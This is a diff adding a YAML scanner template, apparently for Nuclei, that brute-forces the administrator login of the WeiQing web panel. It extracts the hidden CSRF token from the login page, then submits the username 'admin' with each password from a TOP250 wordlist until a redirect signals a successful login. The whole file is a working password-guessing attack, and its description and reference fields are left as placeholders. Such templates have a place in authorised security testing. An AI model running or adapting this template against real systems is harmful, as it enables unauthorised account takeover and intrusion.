@@ -1,0 +1,72 @@
+id: login-fuzz-weiqing
+
+info:
+  name: login-fuzz-weiqing
+  author: capiton
+  severity: high
+  description: description
+  reference:
+    - https://
+
+requests:
+  - raw:
+      - |+
+        GET /web/index.php?c=user&a=login& HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Referer: {{RootURL}}
+
+      - |-
+        POST /web/index.php?c=user&a=login& HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Referer: {{RootURL}}/web/index.php?c=user&a=login&
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+
+        login_type=system&username={{username}}&password={{password}}&submit=%E7%99%BB%E5%BD%95&token={{token}}
+
+    payloads:
+      username:
+        - admin
+      password: "0.local/helpers/wordlists/password-TOP250"
+    
+    attack: clusterbomb
+    stop-at-first-match: true
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - '<input name="token" value="([A-Za-z0-9.-]+)" type="hidden" />'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - do=system
+      - type: status
+        status:
+          - 302
